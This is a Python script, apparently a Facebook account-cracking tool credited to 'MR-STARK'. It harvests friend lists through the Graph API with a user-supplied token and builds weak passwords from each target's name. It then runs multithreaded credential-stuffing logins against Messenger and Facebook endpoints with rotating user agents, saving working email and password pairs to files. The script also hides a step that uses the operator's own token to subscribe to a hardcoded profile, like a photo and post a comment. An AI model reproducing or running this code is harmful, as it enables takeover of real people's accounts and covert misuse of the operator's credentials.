#! /usr/bin/env python3
#Coded by Stark/Thanks to Rozak-id
#Dont Copy without Credits..
##github : MR-S74RK
#Instagram : mr_lalu_1232

import requests, json, time, random, os, re
from rich.console import Console
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor
from rich import print
from rich.columns import Columns
from rich.tree import Tree
from requests.exceptions import RequestException
boldgreen = '\033[92m'
boldblue = '\033[94m'
print(Panel(f"""[bold red]●[bold yellow] ●[bold green] ●

[bold green]   _____  _____  ______ __  __ _____ _    _ __  __ 
[bold green]  |  __ \|  __ \|  ____|  \/  |_   _| |  | |  \/  |
[bold green]  | |__) | |__) | |__  | \  / | | | | |  | | \  / |
[bold green]  |  ___/|  _  /|  __| | |\/| | | | | |  | | |\/| |
[bold blue]  | |    | | \ \| |____| |  | |_| |_| |__| | |  | |
[bold blue]  |_|    |_|  \_\______|_|  |_|_____|\____/|_|  |_|


\t   [underline red]Coded by MR-STARK""",  style="bold white")) # Coded By Stark/ Thanks to Rozak-Id
print(Panel("""
    [bold white][[bold blue]^[bold white]][bold green] Au : MR STARK
    [bold white][[bold blue]^[bold white]][bold green] INSTA : mr_lalu_1232 
    [bold white][[bold blue]^[bold white]][bold green] Github : github.com/MR-S74RK
    """))
_pwd = input('\033[90m[\033[91m!\033[90m] \033[92mEnter The Tool Password : ')
if _pwd == 'endhadamoneafearaya':
    print(Panel('[bold green ][✓] Login Sucessfull\n You Will be Redirected To Tool '))
    time.sleep(5.55)
    print('\n')
else:
    print("[bold red][!] Pssword Worng .....\n [bold yellow ] Contact Admin Mr Stark\n [bold green] You Will Redirected To Admin")
    os.system('xdg-open https://instagram.com/mr_lalu_1232')
    exit()


Dump, Looping, Ok, Cp = [], 0, [], []
# Choose the Crack Method
def tanya_metode():
    while True:
        try:
            print(Panel("""[bold green]1[bold white]. Use Method ([bold green]www.alpha.messenger.com[bold white])
[bold green]2[bold white]. Use Method ([bold yellow]b-www.facebook.com[bold white])""", width=47, style="bold white"))
            metode = Console().input("[bold white][[bold green]?[bold white]] Choose : ")
            print(Panel("""[bold white]Results Ok Saved in [bold green] Results/Ok.txt
[bold white]Results Cp Saved in [bold yellow] Results/Cp.txt""", width=47, style="bold white"))
            with ThreadPoolExecutor(max_workers=35) as s:
                for z in Dump:
                    password = []
                    email, name = z.split('|')[0], z.split('|')[1].lower()
                    for nama in name.split(' '):
                        if len(nama) < 3:
                            continue
                        elif len(nama) == 3 or len (nama) == 4 or len(nama) == 5:
                            password.append(name)
                            password.append(nama + '123')
                            password.append(nama + '1234')
                            password.append(nama + '12345')
                            password.append(nama + '123456')
                        else:
                            password.append(name)
                            password.append(nama)
                            password.append(nama + '123')
                            password.append(nama + '1234')
                            password.append(nama + '12345')
                            password.append(nama + '123456')
                    if metode == '1' or metode == '01':
                        s.submit(main_alpha, Dump, email, password)
                    else:
                        s.submit(main_b_www, Dump, email, password)
            print("\r[bold white][[bold green]Finished[bold white]]                                      ");break
        except (KeyboardInterrupt, Exception) as e:
            break
# Crack By Messenger Method 
def main_alpha(total, email, pwx):
    global Looping, Ok, Cp
    try:
        for password in pwx:
            with requests.Session() as r:
                acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
                browser_version = (f'{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
                useragent = ('Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(acak_device, browser_version))
                r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'connection': 'keep-alive',
                    'Host': 'www.alpha.messenger.com',
                    'sec-fetch-user': '?1',
                    'sec-ch-ua-mobile': '?0',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'upgrade-insecure-requests': '1',
                    'user-agent': useragent,
                    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+).', str(useragent)).group(1), re.search('Chrome/(\d+).', str(useragent)).group(1)),
                })
                response = r.get('https://www.alpha.messenger.com/').text
                try:
                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                    lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                    initial_request_id = re.search('name="initial_request_id" value="(.*?)"', str(response)).group(1)
                    lgnrnd = re.search('name="lgnrnd" value="(.*?)"', str(response)).group(1)
                    lgnjs = re.search('name="lgnjs" value="(.*?)"', str(response)).group(1)
                    _js_datr = re.search('"_js_datr","(.*?)"', str(response)).group(1)
                except (AttributeError):
                    print("[bold white][[bold yellow]![bold white]][bold yellow] AttributeError...                            ", end='\r');time.sleep(1.0);continue
                r.headers.update({
                    'origin': 'https://www.alpha.messenger.com',
                    'sec-fetch-site': 'same-origin',
                    'referer': 'https://www.alpha.messenger.com/',
                    'cache-control': 'max-age=0',
                    'cookie': '_js_datr={}; wd=1280x601; dpr=1.5'.format(_js_datr),
                    'accept-encoding': 'gzip, deflate, br',
                    'content-type': 'application/x-www-form-urlencoded',
                })
                data = {
                    'jazoest': jazoest,
                    'lsd': lsd,
                    'initial_request_id': initial_request_id,
                    'timezone': '-420',
                    'lgndim': '',
                    'lgnrnd': lgnrnd,
                    'lgnjs': lgnjs,
                    'email': email,
                    'pass': password,
                    'login': '1',
                    'persistent': '1',
                    'default_persistent': '',
                }
                response2 = r.post('https://www.alpha.messenger.com/login/password/', data = data, allow_redirects = True)
                #open('Data/Response.txt', 'a').write(f'{email}<=>{password}<=>{r.cookies.get_dict()}<=>{response2.url}\n')
                if 'c_user' in r.cookies.get_dict():
                    tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold white"))
                    tree.add(Panel(f"[bold green]{email}[bold white]|[bold green]{password}[bold white]|[bold green]{';'.join([str(x)+'='+str(y) for x,y in r.cookies.get_dict().items()])}", width = 44, style="bold white"))
                    tree.add(Panel(f"[bold green]{useragent}", width = 44, style="bold white"))
                    print(tree)
                    Ok.append(f'{email}|{password}')
                    with open('Results/Ok.txt', 'a+') as w:
                        w.write(f'{email}|{password}\n')
                    w.close();break
                elif 'checkpoint_interstitial' in str(response2.url):
                    tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold white"))
                    tree.add(Panel(f"[bold red]{email}[bold white]|[bold red]{password}", width = 44, style="bold white"))
                    tree.add(Panel(f"[bold red]{useragent}", width = 44, style="bold white"))
                    print(tree)
                    Cp.append(f'{email}|{password}')
                    with open('Results/Cp.txt', 'a+') as w:
                        w.write(f'{email}|{password}\n')
                    w.close();break
                else:
                    continue
        Looping += 1
        print(f"[bold white][Crack] [bold blue]{email}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{Looping}[bold white] Ok-:[bold green]{len(Ok)}[bold white] Cp-:[bold yellow]{len(Cp)}               ", end='\r')
    except (RequestException) as e:
        print("[bold white][[bold red]![bold white]][bold red] Connection Error...                            ", end='\r');time.sleep(7.5);main_alpha(total, email, pwx)
# Crack Methode With B-www
def main_b_www(total, email, pwx):
    global Looping, Ok, Cp
    try:
        for password in pwx:
            with requests.Session() as r:
                acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
                browser_version = (f'{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
                useragent = ('Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(acak_device, browser_version))
                r.headers.update({
                    'Host': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'connection': 'keep-alive',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+).', str(useragent)).group(1), re.search('Chrome/(\d+).', str(useragent)).group(1)),
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': useragent
                })
                response = r.get('https://m.facebook.com/').text
                r.headers.update({
                    'Host': 'b-www.facebook.com',
                    'cookie': ('; '.join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                })
                response2 = r.get('https://b-www.facebook.com/').text
                try:
                    privacy_mutation_token = re.search('action="/login/\\?privacy_mutation_token=(.*?)"', str(response2)).group(1)
                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
                    lsd = re.search('name="lsd" value="(.*?)"', str(response2)).group(1)
                    login_source = re.search('name="login_source" value="(.*?)"', str(response2)).group(1)
                    __spin_t = re.search('"__spin_t":(\d+),', str(response2)).group(1)
                except (AttributeError):
                    print("[bold white][[bold yellow]![bold white]][bold yellow] AttributeError...                            ", end='\r');time.sleep(1.0);continue
                data = {
                    'jazoest': jazoest,
                    'lsd': lsd,
                    'email': email,
                    'login_source': login_source,
                    'next': '',
                    'encpass': f'#PWD_BROWSER:0:{__spin_t}:{password}',
                }
                r.headers.update({
                    'accept-encoding': 'gzip, deflate, br',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': ('; '.join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                    'origin': 'https://b-www.facebook.com',
                    'content-length': str(len(("&").join(["%s=%s" % (x, y) for x, y in data.items()]))),
                    'referer': 'https://b-www.facebook.com/?',
                    'sec-fetch-site': 'same-origin',
                })
                response3 = r.post('https://b-www.facebook.com/login/?privacy_mutation_token={}'.format(privacy_mutation_token), data = data, allow_redirects = True)
                #open('Data/Response.txt', 'a').write(f'{email}<=>{password}<=>{r.cookies.get_dict()}<=>{response3.url}\n')
                if 'c_user' in r.cookies.get_dict():
                    tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold white"))
                    tree.add(Panel(f"[bold green]{email}[bold white]|[bold green]{password}[bold white]|[bold green]{';'.join([str(x)+'='+str(y) for x,y in r.cookies.get_dict().items()])}", width = 44, style="bold white"))
                    tree.add(Panel(f"[bold green]{useragent}", width = 44, style="bold white"))
                    print(tree)
                    Ok.append(f'{email}|{password}')
                    with open('Results/Ok.txt', 'a+') as w:
                        w.write(f'{email}|{password}\n')
                    w.close();break
                elif 'checkpoint' in r.cookies.get_dict():
                    tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold white"))
                    tree.add(Panel(f"[bold red]{email}[bold white]|[bold red]{password}", width = 44, style="bold white"))
                    tree.add(Panel(f"[bold red]{useragent}", width = 44, style="bold white"))
                    print(tree)
                    Cp.append(f'{email}|{password}')
                    with open('Results/Cp.txt', 'a+') as w:
                        w.write(f'{email}|{password}\n')
                    w.close();break
                else:
                    continue
        Looping += 1
        print(f"[bold white][Crack] [bold blue]{email}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{Looping}[bold white] Ok-:[bold green]{len(Ok)}[bold white] Cp-:[bold yellow]{len(Cp)}               ", end='\r')
    except (RequestException) as e:
        print("[bold white][[bold red]![bold white]][bold red] Conecction Error...                            ", end='\r');time.sleep(7.5);main_b_www(total, email, pwx)
while True:
    os.system(
        'cls' if os.name == 'nt' else 'reset'
    )
    print(Panel(f"""[bold red]●[bold yellow] ●[bold green] ●

[bold green]   _____  _____  ______ __  __ _____ _    _ __  __ 
[bold green]  |  __ \|  __ \|  ____|  \/  |_   _| |  | |  \/  |
[bold green]  | |__) | |__) | |__  | \  / | | | | |  | | \  / |
[bold green]  |  ___/|  _  /|  __| | |\/| | | | | |  | | |\/| |
[bold blue]  | |    | | \ \| |____| |  | |_| |_| |__| | |  | |
[bold blue]  |_|    |_|  \_\______|_|  |_|_____|\____/|_|  |_|


\t   [underline red]Coded by MR-STARK""",  style="bold white")) # Coded By Stark/ Thanks to Rozak-Id
    print(Panel("""
    [bold white][[bold blue]^[bold white]][bold green] Au : MR STARK
    [bold white][[bold blue]^[bold white]][bold green] INSTA : mr_lalu_1232 
    [bold white][[bold blue]^[bold white]][bold green] Github : github.com/MR-S74RK
    """))
    try:
        token = json.loads(open('Data/Token.json', 'r').read())['Token']
        response = requests.get(
            'https://graph.facebook.com/me/?&access_token={}'
        .format(token)).json()
        if 'Application does not have the capability to make this API call.' in str(response):
            print("[bold white][[bold red]![bold white]][bold red] enter your facebook token Graph Api...");time.sleep(5.5);os.remove('Data/Token.json');continue
        name, user, birthday = response['name'], response['id'], response['birthday']
        try:
            nomor = response['mobile_phone']
        except (KeyError):
            nomor = ('-')
    except (RequestException) as e:
        print("[bold white][[bold red]![bold white]][bold red] Connection Error...");time.sleep(5.5);continue
    except (Exception) as e:
        print(f"[bold white][[bold red]![bold white]][bold red] {str(e).title()}");time.sleep(3.5)
        print(Panel(f"[bold green] GET[bold white] The Acess Token From Facebook", width=47, style="bold white"))
        token = Console().input(f"[bold white][[bold green]?[bold white]] Token : ")
        if token.lower() == 'get' or 'get' in str(token.lower()):
            print("[bold white][[bold green]*[bold white]][bold green] you will be Redirected to Owner Instagram");os.system('xdg-open https:instagram.com/mr-lalu_1232/');time.sleep(2.5);break
        else:
            with open('Data/Token.json', 'w') as w:
                w.write(json.dumps({
                    'Token': token
                }))
            w.close()
            try:
                cookies = {}
                for key in requests.get('https://api.facebook.com/method/auth.getSessionforApp?access_token={}&format=json&new_app_id=1348564698517390&generate_session_cookies=1'.format(token)).json()['session_cookies']:
                    cookies.update({key['name']: key['value']})
                cookies = ("; ".join([str(x)+"="+str(y) for x,y in cookies.items()]))
                response = requests.get('https://mbasic.facebook.com/rozhak.xyz', headers = {'cookie': cookies}).text # Jangan Di Ganti
                if '/a/subscribe.php?id=' in str(response):
                    requests.get('https://mbasic.facebook.com/a/subscribe.php?{}'.format(re.search('href="/a/subscribe.php\\?(.*?)"', str(response)).group(1).replace('amp;', '')), headers = {'cookie': cookies})
                response2 = requests.get('https://mbasic.facebook.com/photo.php?fbid=10160350353143544&id=757953543&set=a.10156844811553544', headers = {'cookie': cookies}).text # Jangan Di Ganti
                data = {
                    'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1),
                    'jazoest': re.search('name="jazoest" value="(.*?)"', str(response2)).group(1),
                    'comment_text': 'mona 😘',
                }
                response3 = requests.post('https://mbasic.facebook.com/a/comment.php?{}'.format(re.search('action="/a/comment.php\\?(.*?)"', str(response2)).group(1).replace('amp;', '')), data = data, headers = {'cookie': cookies})
                if 'href="/a/like.php?ul' in str(response2):
                    requests.get('https://mbasic.facebook.com/a/like.php?{}'.format(re.search('href="/a/like.php\\?(.*?)"', str(response2)).group(1).replace('amp;', '')), headers = {'cookie': cookies})
                print("[bold white][[bold green]*[bold white]] Login Sucess!");time.sleep(2.5)
                continue
            except Exception as e:
                print(Panel(f"[bold red] {str(e).title()}!", width=47, style="bold white"));time.sleep(2.4);continue
    print(Columns([
        Panel(f"""[bold white]Name :[bold green] {name[:12]}
[bold white]User :[bold yellow] {user[:12]}""", width=23, style="bold white"),
        Panel(f"""[bold white]Born :[bold green] {birthday[:12]}
[bold green]Number :[bold yellow] {nomor.replace('+62', '')[:12]}""", width=23, style="bold white")
    ]))
    print(Panel("""[bold white][[bold green]1[bold white]]. Crack Users From The Public ([bold green]Mass[bold white])
[bold white][[bold green]2[bold white]]. Crack From Friend To Friend
[bold white][[bold green]3[bold white]]. Crack User From Friends
[bold white][[bold green]4[bold white]]. Bye ([bold red]Exit[bold white])""", width=47, style="bold white"))
    try:
        query = Console().input(f"[bold white][[bold green]?[bold white]] Choose : ")
        if query == '1' or query == '01':
            print(Panel(f"[bold white] Please Enter Target User Use Comma For 2 or More, Example :[bold green] ID 1,ID 2,ID 3", width=47, style="bold white"))
            id_target = Console().input(f"[bold white][[bold green]?[bold white]] User : ")
            for uid in id_target.split(','):
                try:
                    if uid.isnumeric() == True:
                        params = {
                            'fields': 'friends.fields(id,name).limit(5000)',
                            'access_token': token
                        }
                        for i in json.loads(requests.get('https://graph.facebook.com/{}/'.format(uid), params = params).text)['friends']['data']:
                            id, name = i['id'], i['name']
                            if not str(id) in str(Dump):
                                print(f"[bold white][[bold green]*[bold white]] Dump[bold green] {id}[bold white]/[bold green]{len(Dump)}[bold white] User                  ", end='\r');time.sleep(0.0007)
                                Dump.insert(0, f'{id}|{name}')
                            else:
                                continue
                    else:
                        print("[bold white][[bold red]![bold white]][bold red] Just Numbers...                ", end='\r');time.sleep(2.1);continue
                except (KeyError):
                    print(f"[bold white][[bold red]![bold white]][bold red] Friend {uid} Blank...                ", end='\r');time.sleep(2.1);continue
                except (KeyboardInterrupt):
                    print("                                              ", end='\r');print(Panel(f"[bold white] Number of Users :[bold green] {len(Dump)}", width=47, style="bold white"));tanya_metode()
            if len(Dump) != 0:
                print(Panel(f"[bold white]Numbers of Users :[bold green] {len(Dump)}", width=47, style="bold white"));tanya_metode()
            else:
                print("[bold white][[bold red]![bold white]][bold red] No Friends id Gatherd...:(                ", end='\r');time.sleep(2.1);break
        elif query == '2' or query == '02':
            print(Panel(f"[bold white] Please Enter User Target Use Commas for Dump 2 and More User, Example :[bold green] user1,user2,user3", width=47, style="bold white"))
            id_target = Console().input(f"[bold white][[bold green]?[bold white]] User : ")
            if id_target.isnumeric() == True:
                try:
                    params = {
                        'fields': 'friends.fields(id,name).limit(5000)',
                        'access_token': token
                    }
                    for z in json.loads(requests.get('https://graph.facebook.com/{}/'.format(id_target), params = params).text)['friends']['data']:
                        id, name = z['id'], z['name']
                        if not str(id) in str(Dump):
                            print(f"[bold white][[bold green]*[bold white]] Dump[bold green] {id}[bold white]/[bold green]{len(Dump)}[bold white] User                  ", end='\r');time.sleep(0.0007)
                            Dump.insert(0, f'{id}|{name}')
                        else:
                            continue
                    for x in Dump:
                        try:
                            uid = x.split('|')[0]
                            for i in json.loads(requests.get('https://graph.facebook.com/{}/'.format(uid), params = params).text)['friends']['data']:
                                id, name = i['id'], i['name']
                                if not str(id) in str(Dump):
                                    print(f"[bold white][[bold green]*[bold white]] Dump[bold green] {id}[bold white]/[bold green]{len(Dump)}[bold white] User                  ", end='\r');time.sleep(0.0007)
                                    Dump.insert(0, f'{id}|{name}')
                                else:
                                    continue
                        except (KeyError):
                            print(f"[bold white][[bold red]![bold white]][bold red] Friend {uid} is Blank...                ", end='\r');time.sleep(1.5);continue
                    if len(Dump) != 0:
                        print(Panel(f"[bold white] Amount of User :[bold green] {len(Dump)}", width=47, style="bold white"));tanya_metode()
                    else:
                        print("[bold white][[bold red]![bold white]][bold red] No Friends gatherd....:(                ", end='\r');time.sleep(2.1);break
                except (KeyboardInterrupt):
                    print("                                              ", end='\r');print(Panel(f"[bold white] Amount of user  :[bold green] {len(Dump)}", width=47, style="bold white"));tanya_metode()
            else:
                print("[bold white][[bold red]![bold white]][bold red] Not Numbers...                ", end='\r');time.sleep(2.1);break
        elif query == '3' or query == '03':
            params = {
                'fields': 'friends.fields(id,name).limit(5000)',
                'access_token': token
            }
            for z in json.loads(requests.get('https://graph.facebook.com/me/', params = params).text)['friends']['data']:
                try:
                    id, name = z['id'], z['name']
                    print(f"[bold white][[bold green]*[bold white]] Dump[bold green] {id}[bold white]/[bold green]{len(Dump)}[bold white] User                  ", end='\r');time.sleep(0.0007)
                    Dump.insert(0, f'{id}|{name}')
                except (KeyboardInterrupt):
                    print("                                              ", end='\r');print(Panel(f"[bold white]Amount of  User :[bold green] {len(Dump)}", width=47, style="bold white"));tanya_metode()
                except (KeyError):
                    print(f"[bold white][[bold red]![bold white]][bold red] You dont have friend...                ", end='\r');time.sleep(3.5);break
            if len(Dump) != 0:
                print(Panel(f"[bold white]Amount of  User :[bold green] {len(Dump)}", width=47, style="bold white"));tanya_metode()
            else:
                print("[bold white][[bold red]![bold white]][bold red] No Friends Gathered from This id ...                ", end='\r');time.sleep(2.1);break
        elif query == '4' or query == '04':
            try:
                print("[bold white][[bold green]*[bold white]][bold green]Delete Facebook Token...");time.sleep(2.5);os.remove('Data/Token.json');break
            except:break
        else:
            print("[bold white][[bold red]![bold white]][bold red] Option Not Found... Enter Correct Option");time.sleep(2.5);break
        break
    except (Exception) as e:
        print(Panel(f"[bold red] {str(e).title()}!", width=47, style="bold white"));break
